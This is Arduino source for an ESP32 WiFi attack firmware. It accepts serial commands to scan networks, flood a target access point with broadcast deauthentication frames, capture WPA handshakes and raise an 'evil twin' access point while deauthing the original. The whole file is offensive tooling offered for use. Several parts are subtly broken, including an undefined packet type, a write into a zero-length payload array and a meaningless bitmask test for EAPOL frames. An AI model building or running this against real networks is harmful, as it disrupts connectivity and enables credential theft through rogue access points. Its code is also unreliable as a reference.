/*
 * SECOPS ESP32 WiFi Attack Firmware
 * Performs deauth attacks, handshake capture, and evil twin
 */

#include <WiFi.h>
#include <esp_wifi.h>
#include "esp_wifi_types.h"

// Configuration
#define LED_BUILTIN 2
#define UART_BAUD 115200

// Attack structures
typedef struct {
  uint8_t bssid[6];
  int channel;
  bool active;
} AttackTarget;

AttackTarget current_target = {0};
bool attack_running = false;
String attack_type = "";

// Packet structures
typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t da[6];
  uint8_t sa[6];
  uint8_t bssid[6];
  uint16_t seq_ctrl;
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_ieee80211_packet_t;

void setup() {
  Serial.begin(UART_BAUD);
  pinMode(LED_BUILTIN, OUTPUT);
  
  // Initialize WiFi in promiscuous mode
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);
  
  Serial.println("ESP32 Attack Module Ready");
  Serial.println("Commands: SCAN, DEAUTH <bssid>,<channel>, HANDSHAKE <bssid>,<channel>, EVILTWIN <ssid>");
  
  digitalWrite(LED_BUILTIN, HIGH);
  delay(500);
  digitalWrite(LED_BUILTIN, LOW);
}

void loop() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    process_command(command);
  }
  
  if (attack_running) {
    if (attack_type == "deauth") {
      send_deauth_packets();
    } else if (attack_type == "handshake") {
      capture_handshake();
    }
    delay(100);
  }
}

void process_command(String cmd) {
  if (cmd == "SCAN") {
    scan_networks();
  } 
  else if (cmd.startsWith("DEAUTH")) {
    parse_target(cmd.substring(7));
    attack_type = "deauth";
    attack_running = true;
    Serial.println("DEAUTH attack started");
  }
  else if (cmd.startsWith("HANDSHAKE")) {
    parse_target(cmd.substring(10));
    attack_type = "handshake";
    attack_running = true;
    Serial.println("Handshake capture started");
  }
  else if (cmd.startsWith("EVILTWIN")) {
    String ssid = cmd.substring(9);
    start_evil_twin(ssid);
  }
  else {
    Serial.println("Unknown command");
  }
}

void parse_target(String target_str) {
  int comma_pos = target_str.indexOf(',');
  String bssid_str = target_str.substring(0, comma_pos);
  String channel_str = target_str.substring(comma_pos + 1);
  
  // Parse BSSID
  sscanf(bssid_str.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
         &current_target.bssid[0], &current_target.bssid[1],
         &current_target.bssid[2], &current_target.bssid[3],
         &current_target.bssid[4], &current_target.bssid[5]);
  
  current_target.channel = channel_str.toInt();
  current_target.active = true;
  
  // Set channel
  esp_wifi_set_channel(current_target.channel, WIFI_SECOND_CHAN_NONE);
}

void scan_networks() {
  Serial.println("Scanning networks...");
  int networks_found = WiFi.scanNetworks();
  
  for (int i = 0; i < networks_found; i++) {
    uint8_t* bssid = WiFi.BSSID(i);
    Serial.printf("NETWORK:%s,%02X:%02X:%02X:%02X:%02X:%02X,%d,%d,%s\n",
                  WiFi.SSID(i).c_str(),
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                  WiFi.channel(i),
                  WiFi.RSSI(i),
                  WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "OPEN" : "SECURE");
  }
  
  WiFi.scanDelete();
  Serial.println("SCAN_COMPLETE");
}

void send_deauth_packets() {
  wifi_packet_t packet;
  memset(&packet, 0, sizeof(packet));
  
  // Build deauth frame
  packet.hdr.frame_ctrl = 0xC0; // Deauth frame
  packet.hdr.duration = 0x013A;
  
  // Destination = broadcast
  memset(packet.hdr.da, 0xFF, 6);
  
  // Source = target BSSID
  memcpy(packet.hdr.sa, current_target.bssid, 6);
  memcpy(packet.hdr.bssid, current_target.bssid, 6);
  
  packet.hdr.seq_ctrl = 0;
  packet.payload[0] = 0x07; // Reason code: Class 3 frame from nonassociated STA
  
  // Send packet
  esp_wifi_80211_tx(WIFI_IF_STA, &packet, sizeof(packet), false);
  digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
}

void capture_handshake() {
  // Handshake capture is handled by promiscuous callback
  // This just maintains the attack state
}

void promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
  
  // Check for EAPOL frames (handshake)
  if (ipkt->hdr.frame_ctrl & 0x8888) {
    // EAPOL frame detected
    Serial.println("HANDSHAKE_PACKET_CAPTURED");
    digitalWrite(LED_BUILTIN, HIGH);
    delay(100);
    digitalWrite(LED_BUILTIN, LOW);
  }
}

void start_evil_twin(String ssid) {
  Serial.printf("Starting Evil Twin AP: %s\n", ssid.c_str());
  
  // Stop any ongoing attacks
  attack_running = false;
  
  // Setup AP
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid.c_str(), "password123", 6, 0, 4);
  
  // Start deauth on original AP
  attack_type = "deauth";
  attack_running = true;
  
  Serial.println("EVIL_TWIN_RUNNING");
}

// Helper function to convert string to MAC
void string_to_mac(String mac_str, uint8_t* mac) {
  sscanf(mac_str.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}